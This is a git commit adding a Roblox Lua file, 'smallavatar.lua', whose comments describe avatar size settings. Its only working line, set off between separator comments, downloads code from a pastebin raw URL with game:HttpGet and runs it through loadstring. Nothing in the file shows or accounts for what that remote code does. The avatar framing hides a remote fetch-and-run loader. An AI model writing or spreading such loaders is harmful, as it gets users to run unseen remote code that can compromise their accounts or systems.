be992352557059fdd59a5927af5c4e9d72bd731c
UssiaK <111480418+UssiaK@users.noreply.github.com>
2022-09-25 16:00:46 -0400

    Add files via upload

---
+++ smallavatar.lua
@@ -0,0 +1,9 @@
+--R15
+--90 height
+--70 width
+--100 head
+--100 proportion 
+ 
+ --                                                                --
+loadstring(game:HttpGet("https://pastebin.com/raw/R4k84r1f", true))()
+ --                                                                --
